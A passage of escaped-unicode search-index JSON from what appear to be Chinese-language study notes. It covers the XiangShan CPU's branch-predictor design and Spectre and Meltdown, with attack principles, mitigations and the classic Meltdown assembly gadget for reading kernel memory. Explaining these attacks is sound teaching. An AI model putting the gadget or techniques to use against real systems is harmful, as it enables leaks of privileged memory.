\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u504f\u79fb\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6307\u4ee4\u200b\u5bf9\u9f50\u200b\u5230\u200b 2\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u504f\u79fb\u200b\u7684\u200b\u6700\u4f4e\u200b 1 \u200b\u4f4d\u200b</li> </ul> <p>\u200b\u4e8e\u662f\u200b MicroBTB \u200b\u7684\u200b\u8f93\u51fa\u200b\u5c31\u662f\u200b\u6bcf\u4e2a\u200b predict bank \u200b\u7684\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>class MicroBTBResp extends Resp\n{\n    val targets = Vec(PredictWidth, UInt(VAddrBits.W))\n    val hits = Vec(PredictWidth, Bool())\n    val takens = Vec(PredictWidth, Bool())\n    val brMask = Vec(PredictWidth, Bool())\n    val is_RVC = Vec(PredictWidth, Bool())\n}\n</code></pre> <p>\u200b\u62ff\u5230\u200b\u6bcf\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b\u6307\u4ee4\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u9884\u6d4b\u200b\u7ed3\u679c\u200b\u4ee5\u540e\u200b\uff0c\u200b\u518d\u200b\u627e\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u53d6\u5176\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b fetch \u200b\u5730\u5740\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b MicroBTB\uff0c\u200b\u5bf9\u4e8e\u200b 32B \u200b\u7684\u200b\u6bcf\u4e2a\u200b 2B \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b 16 \u200b\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u603b\u5171\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b 256 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u53ea\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u6b21\u200b\u3002</p> <p>MicroBTB \u200b\u7684\u200b\u9884\u6d4b\u200b\u662f\u200b Next Line Predictor\uff0c\u200b\u4e0d\u4f1a\u200b\u5f15\u5165\u200b\u989d\u5916\u200b\u7684\u200b\u6c14\u6ce1\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u5e8f\u200b\u6bd4\u8f83\u200b\u7d27\u5f20\u200b\uff0c\u200b\u6240\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd8\u6709\u200b\u66f4\u5927\u200b\u7684\u200b BTB\uff0c\u200b\u9ed8\u8ba4\u8bbe\u7f6e\u200b\u4e0b\u200b\uff0cBTB \u200b\u5927\u5c0f\u200b\u662f\u200b 2048 \u200b\u9879\u200b\uff0c2 \u200b\u8def\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u53c8\u200b\u5206\u4e3a\u200b 16 \u200b\u4e2a\u200b bank\uff0c\u200b\u6298\u7b97\u200b\u4e0b\u6765\u200b\u5c31\u662f\u200b 64 \u200b\u4e2a\u200b Set\u3002BTB \u200b\u6bcf\u4e2a\u200b entry \u200b\u8bb0\u5f55\u200b\u4e86\u200b\uff1a</p> <ul> <li>isBr: \u200b\u662f\u5426\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b</li> <li>isRVC: \u200b\u662f\u5426\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b</li> <li>valid: \u200b\u662f\u5426\u200b\u5408\u6cd5\u200b</li> <li>28 bit tag: \u200b\u7528\u4e8e\u200b\u627e\u5230\u200b\u5339\u914d\u200b\u7684\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b entry\uff0c28 \u200b\u7b49\u4e8e\u200b 39(\u200b\u865a\u62df\u5730\u5740\u200b\u4f4d\u6570\u200b) - 5(\u200b\u4e00\u6b21\u200b fetch 32B) - 6(index \u200b\u4f4d\u6570\u200b\uff0clog2(64))</li> <li>13 bit lower: \u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u504f\u79fb\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6307\u4ee4\u200b\u5bf9\u9f50\u200b\u5230\u200b 2\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u504f\u79fb\u200b\u7684\u200b\u6700\u4f4e\u200b 1 \u200b\u4f4d\u200b</li> <li>1 bit extend: \u200b\u5982\u679c\u200b lower \u200b\u4f4d\u6570\u200b\u4e0d\u591f\u200b\uff0c\u200b\u628a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4fdd\u5b58\u200b\u5728\u200b\u53e6\u5916\u200b\u7684\u200b\u5730\u65b9\u200b</li> </ul> <p>\u200b\u5f53\u200b\u504f\u79fb\u200b\u8fc7\u5927\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u5b58\u200b\u5230\u200b lower \u200b\u5185\u65f6\u200b\uff0cBTB \u200b\u4fdd\u5b58\u200b\u4e86\u200b\u989d\u5916\u200b 64 \u200b\u4e2a\u200b 39 \u200b\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u6570\u7ec4\u200b\uff0c\u200b\u76f4\u63a5\u200b\u6620\u5c04\u200b\uff0c\u200b\u5f53\u200b extern=1 \u200b\u65f6\u200b\u7528\u4e8e\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u3002</p> <p>2 \u200b\u4f4d\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\u53e6\u5916\u200b\u7ef4\u62a4\u200b\u5728\u200b BIM \u200b\u7ed3\u6784\u200b\u5185\u200b\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u90e8\u4ef6\u200b\uff0c\u200b\u4f8b\u5982\u200b TAGE\uff0c\u200b\u90fd\u200b\u6309\u200b\u76f8\u540c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u7ec4\u4e86\u200b bank\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_8","title":"\u5357\u6e56","text":"<p>\u200b\u9999\u5c71\u200b\u5904\u7406\u5668\u200b\u524d\u7aef\u200b\u53d6\u6307\u200b\u67b6\u6784\u200b\u6f14\u8fdb\u200b</p> <p>\u200b\u96c1\u6816\u6e56\u200b\u662f\u200b coupled \u200b\u524d\u7aef\u200b\uff0c\u200b\u5357\u6e56\u200b\u6539\u6210\u200b\u4e86\u200b decoupled \u200b\u524d\u7aef\u200b\u3002\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u65b9\u9762\u200b\uff0c\u200b\u4e4b\u524d\u200b\u96c1\u6816\u6e56\u200b\u7684\u200b BTB \u200b\u662f\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u4e00\u4e2a\u200b entry\uff0c\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\u9700\u8981\u200b\u5bf9\u200b 32B \u200b\u7684\u200b\u6bcf\u4e2a\u200b 2B \u200b\u5206\u522b\u200b\u9884\u6d4b\u200b\uff0c16 \u200b\u8def\u200b\u5e76\u884c\u200b\uff0c\u200b\u518d\u200b\u5904\u7406\u200b 16 \u200b\u8def\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u5357\u6e56\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u5219\u200b\u4e0d\u540c\u200b\uff0c\u200b\u6839\u636e\u200b fetch \u200b\u5730\u5740\u200b\uff0c\u200b\u9884\u6d4b\u200b\u4ece\u200b\u8fd9\u4e2a\u200b fetch \u200b\u5730\u5740\u200b\u5f00\u59cb\u200b\u7684\u200b 32B \u200b\u5b57\u8282\u200b\uff08\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u5bf9\u9f50\u200b\u5230\u200b\u7f13\u5b58\u200b\u884c\u200b\uff09\uff0c\u200b\u8fd9\u200b\u6bb5\u200b\u7a7a\u95f4\u200b\u5185\u200b\u7684\u200b\u6700\u200b\u591a\u200b\u4e24\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b\u4ee3\u7801\u200b\u91cc\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u5bc6\u5ea6\u200b\u5e76\u200b\u6ca1\u6709\u200b\u90a3\u4e48\u200b\u9ad8\u200b\uff0c\u200b\u4ee5\u200b 32B \u200b\u7684\u200b\u7c92\u5ea6\u200b\u67e5\u8be2\u200b 2 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u50cf\u200b\u96c1\u6816\u6e56\u200b\u90a3\u6837\u200b\u5e76\u884c\u200b\u67e5\u8be2\u200b 16 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002</p> <p>\u200b\u867d\u7136\u200b\u6700\u200b\u591a\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u4f46\u662f\u200b\u8bb0\u5f55\u200b\u4e24\u4e2a\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u7b2c\u4e00\u4e2a\u200b\u662f\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u540c\u65f6\u200b\u9884\u6d4b\u200b\u4e24\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u7b2c\u4e00\u6761\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u7528\u200b\u7b2c\u4e8c\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u8df3\u8f6c\u200b\u65b9\u5411\u200b\u51b3\u5b9a\u200b\u4e0b\u200b\u4e00\u6b21\u200b\u9884\u6d4b\u200b\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u5982\u679c\u200b\u7b2c\u4e00\u6761\u200b\u5c31\u662f\u200b\u76f4\u63a5\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4fdd\u5b58\u200b\u7b2c\u4e8c\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u5c31\u200b\u6ca1\u6709\u200b\u610f\u4e49\u200b\u4e86\u200b\u3002\u200b\u5982\u679c\u200b 32B \u200b\u533a\u95f4\u200b\u5185\u6709\u200b\u591a\u4e8e\u200b\u4e24\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u6700\u200b\u591a\u200b\u53ea\u80fd\u200b\u9884\u6d4b\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u7684\u200b fallthrough \u200b\u5730\u5740\u200b\u6210\u4e3a\u200b\u7b2c\u4e8c\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u4e0b\u200b\u4e00\u6761\u200b\u5730\u5740\u200b\u3002\u200b\u800c\u200b\u4e0d\u662f\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\u52a0\u200b 32B\u3002</p> <p>\u200b\u5f53\u7136\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8bbe\u8ba1\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7f3a\u70b9\u200b\uff1a\u200b\u540c\u200b\u4e00\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u5728\u200b\u591a\u4e2a\u200b entry \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4ed6\u4eec\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\u4e0d\u540c\u200b\u3002</p>"},{"location":"hardware/cpu_vulnerabilities.html","title":"CPU \u200b\u6f0f\u6d1e\u200b\u548c\u200b\u7f13\u89e3\u200b\u63aa\u65bd","text":""},{"location":"hardware/cpu_vulnerabilities.html#vulnerabilities","title":"\u6f0f\u6d1e\u200b Vulnerabilities","text":""},{"location":"hardware/cpu_vulnerabilities.html#spectre","title":"Spectre","text":"<ul> <li>\u200b\u8bba\u6587\u200b Spectre Attacks: Exploiting Speculative Execution</li> <li>Reading privileged memory with a side-channel</li> <li>Spectre Side Channels</li> <li>\u200b\u6709\u200b\u4e24\u4e2a\u200b\u53d8\u79cd\u200b\uff1aVariant 1 \u200b\u548c\u200b Variant 2\uff08Variant 3 \u200b\u662f\u200b Meltdown\uff09</li> <li>Variant 1: Bounds Check Bypass<ul> <li>CVE-2017-5753</li> <li>\u200b\u539f\u7406\u200b\uff1a\u200b\u8bbf\u95ee\u200b\u6570\u7ec4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u6709\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u662f\u200b\u901a\u8fc7\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff1b\u200b\u5373\u4f7f\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u5931\u8d25\u200b\uff0c\u200b\u5982\u679c\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9884\u6d4b\u200b\u5b83\u4f1a\u200b\u68c0\u67e5\u200b\u6210\u529f\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b\u4ee3\u7801\u200b\u88ab\u200b\u6267\u884c\u200b\uff0c\u200b\u8fdb\u800c\u200b\u4ea7\u751f\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u89c2\u5bdf\u200b\u5230\u200b\u7684\u200b\u526f\u4f5c\u7528\u200b</li> <li>\u200b\u653b\u51fb\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u975e\u200b root \u200b\u7528\u6237\u200b\u5229\u7528\u200b eBPF \u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e2d\u200b\u8fd0\u884c\u200b\u81ea\u5b9a\u4e49\u200b\u4ee3\u7801\u200b\uff0c\u200b\u867d\u7136\u200b eBPF \u200b\u5f3a\u5236\u200b\u505a\u200b\u4e86\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\uff0c\u200b\u4f46\u200b\u5904\u7406\u5668\u200b\u4f1a\u200b\u6267\u884c\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\uff0c\u200b\u4ece\u800c\u200b\u6cc4\u6f0f\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u4fe1\u606f\u200b</li> <li>\u200b\u5177\u4f53\u200b\u5230\u200b Linux \u200b\u5185\u6838\u200b\u4e2d\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u573a\u666f\u200b\u662f\u200b swapgs\uff1a\u200b\u5728\u200b\u5207\u6362\u200b\u4e0a\u4e0b\u6587\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5207\u6362\u200b gs \u200b\u6bb5\u200b\u7684\u200b\u57fa\u200b\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u57fa\u200b\u5730\u5740\u200b\u5e94\u8be5\u200b\u7528\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u8fd8\u662f\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\uff0c\u200b\u5c31\u8981\u200b\u6839\u636e\u200b\u5177\u4f53\u60c5\u51b5\u200b\u6765\u200b\u5224\u65ad\u200b\uff0c\u200b\u800c\u200b\u8fd9\u200b\u5c31\u200b\u4f1a\u200b\u5f15\u5165\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff1a     <pre><code>if (coming from user space)\n    swapgs\nmov %gs:&lt;percpu_offset&gt;, %reg\nmov (%reg), %reg1\n</code></pre></li> <li>\u200b\u5982\u679c\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u5728\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\uff0c\u200b\u8df3\u8fc7\u200b\u4e86\u200b swapgs\uff0c\u200b\u76f4\u63a5\u200b\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u57fa\u200b\u5730\u5740\u200b\u53bb\u200b\u8bbf\u95ee\u200b\u5185\u5b58\u200b\uff0c\u200b\u5c31\u200b\u4ea7\u751f\u200b\u4e86\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b</li> <li>\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u95ee\u9898\u200b\u8fd8\u200b\u51fa\u73b0\u200b\u5728\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u590d\u5236\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff1a\u200b\u9700\u8981\u200b\u8c03\u7528\u200b <code>access_ok</code> \u200b\u51fd\u6570\u200b\u6765\u200b\u5224\u65ad\u200b\u6307\u9488\u200b\u662f\u5426\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4f46\u200b\u8fd9\u4e2a\u200b\u5224\u65ad\u200b\u4e5f\u200b\u9700\u8981\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u4ea7\u751f\u200b\u95ee\u9898\u200b</li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>Bounds Clipping</li> <li>\u200b\u7279\u5b9a\u200b\u573a\u666f\u200b\u4e0b\u200b\uff08\u200b\u4f8b\u5982\u200b usercopy \u200b\u548c\u200b swapgs\uff09\u200b\u52a0\u5165\u200b lfence \u200b\u6307\u4ee4\u200b\u963b\u6b62\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b load \u200b\u6307\u4ee4\u200b\u88ab\u200b\u6267\u884c\u200b</li> <li>Supervisor-Mode Access Prevention (SMAP)</li> <li>__user pointer sanitization</li> </ul> </li> </ul> </li> <li>Variant 2: Branch Target Injection (BTI)<ul> <li>CVE-2017-5715</li> <li>\u200b\u539f\u7406\u200b\uff1aCPU \u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\u662f\u200b\u5168\u5c40\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u5185\u200b\u63a7\u5236\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5f53\u200b CPU \u200b\u63a7\u5236\u6743\u200b\u56de\u5230\u200b\u5bbf\u4e3b\u673a\u200b\u65f6\u200b\uff08\u200b\u6bd4\u5982\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b hypercall\uff09\uff0cCPU \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u865a\u62df\u673a\u200b\u51c6\u5907\u200b\u597d\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\u6765\u200b\u8fdb\u884c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u4ece\u800c\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u4e86\u200b\u539f\u672c\u200b\u5bbf\u4e3b\u673a\u200b\u4e0d\u4f1a\u200b\u6267\u884c\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u5177\u4f53\u65b9\u6cd5\u200b\u662f\u200b\u6b3a\u9a97\u200b BTB \u200b\u6216\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u6ce8\u5165\u200b\u653b\u51fb\u8005\u200b\u6307\u5b9a\u200b\u7684\u200b\u5206\u652f\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4f7f\u5f97\u200b CPU \u200b\u5728\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b\u653b\u51fb\u8005\u200b\u6307\u5b9a\u200b\u7684\u200b\u4ee3\u7801\u200b\uff1b\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u653b\u51fb\u200b\u5185\u6838\u200b\u6001\u200b</li> <li>\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u6ce8\u5165\u200b Return Stack Buffer\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5bf9\u200b return \u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u7684\u200b\u9884\u6d4b\u200b</li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>Retpoline</li> <li>Indirect Branch Restricted Speculation (IBRS)</li> <li>Enhanced Indirect Branch Restricted Speculation (Enhanced IBRS)</li> <li>Single Threaded Indirect Branch Predictors (STIBP)</li> <li>Indirect Branch Prediction Barrier (IBPB)</li> <li>Supervisor-Mode Execution Prevention (SMEP)</li> </ul> </li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#meltdown-rouge-data-cache-load","title":"Meltdown (Rouge Data Cache Load)","text":"<ul> <li>\u200b\u8bba\u6587\u200b Meltdown: Reading Kernel Memory from User Space</li> <li>Reading privileged memory with a side-channel</li> <li>CVE-2017-5754</li> <li>Rogue Data Cache Load / CVE-2017-5754 / INTEL-SA-00088</li> <li>Meltdown \u200b\u548c\u200b Spectre \u200b\u4e00\u8d77\u200b\u88ab\u200b\u63d0\u51fa\u200b\uff0c\u200b\u5176\u4e2d\u200b Variant 1 \u200b\u548c\u200b 2 \u200b\u5c5e\u4e8e\u200b Spectre\uff0cVariant 3 \u200b\u5c31\u662f\u200b Meltdown</li> <li>\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u8bfb\u53d6\u200b\u5b8c\u6574\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u786c\u4ef6\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u5728\u200b\u9a8c\u8bc1\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u6743\u9650\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\u4e4b\u524d\u200b\uff0c\u200b\u63d0\u524d\u200b\u628a\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u4f20\u9012\u200b\u7ed9\u200b\u4e86\u200b\u540e\u7eed\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u540e\u7eed\u200b\u53d1\u73b0\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7684\u200b\u6743\u9650\u200b\u9519\u8bef\u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b\u56de\u6eda\u200b</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9875\u8868\u200b\u4e2d\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u5730\u5740\u200b\u4e5f\u200b\u88ab\u200b\u6620\u5c04\u200b\u4e86\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u6743\u9650\u200b\u4f4d\u200b\uff0c\u200b\u7981\u6b62\u200b\u7528\u6237\u200b\u6001\u200b\u8bbf\u95ee\u200b</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u8bbf\u95ee\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u901a\u8fc7\u200b\u67d0\u79cd\u200b\u65b9\u5f0f\u200b\u5e26\u6765\u200b\u4e86\u200b\u526f\u4f5c\u7528\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b load \u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b\u591a\u5c11\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u5229\u7528\u200b\u526f\u4f5c\u7528\u200b\u6765\u200b\u5f97\u5230\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u9996\u5148\u200b\u628a\u200b\u4e00\u4e2a\u200b\u6570\u7ec4\u200b\u4ece\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u518d\u200b\u628a\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u79fb\u4f4d\u200b\u540e\u200b\u4f5c\u4e3a\u200b\u4e0b\u6807\u200b\u53bb\u200b\u8bbf\u95ee\u200b\u6570\u7ec4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u526f\u4f5c\u7528\u200b\u5c31\u662f\u200b\u628a\u200b\u5bf9\u5e94\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u52a0\u8f7d\u200b\u5230\u200b\u7f13\u5b58\u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u6700\u540e\u200b\u518d\u200b\u6d4b\u91cf\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4ece\u800c\u200b\u77e5\u9053\u200b\u4e4b\u524d\u200b\u54ea\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u901a\u8fc7\u200b\u526f\u4f5c\u7528\u200b\u88ab\u200b\u52a0\u8f7d\u200b\u5230\u200b\u7f13\u5b58\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u4ece\u800c\u200b\u5f97\u5230\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u800c\u200b\u8fd9\u200b\u672c\u6765\u200b\u662f\u200b\u53ea\u6709\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u624d\u80fd\u200b\u8bbf\u95ee\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u7531\u4e8e\u200b\u65f6\u95f4\u200b\u7a97\u53e3\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u8bbf\u95ee\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u6570\u636e\u200b\u4e0d\u200b\u5728\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6765\u4e0d\u53ca\u200b\u4ea7\u751f\u200b\u526f\u4f5c\u7528\u200b</li> </ul> </li> <li>\u200b\u4ee3\u7801\u200b\uff1a     <pre><code>; rcx = kernel address, rbx = probe array\nmov al, byte [rcx]         ; read one byte from kernel space\nshl rax, 0xc               ; multiply by 4096\nmov rbx, qword [rbx + rax] ; access probe array\n</code></pre></li> <li>\u200b\u4ece\u200b\u5185\u6838\u200b\u5730\u5740\u200b rcx \u200b\u8bfb\u53d6\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u5de6\u79fb\u200b 0xc\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e58\u4ee5\u200b 4096\uff0c\u200b\u518d\u200b\u53bb\u200b\u8bbf\u95ee\u200b rbx 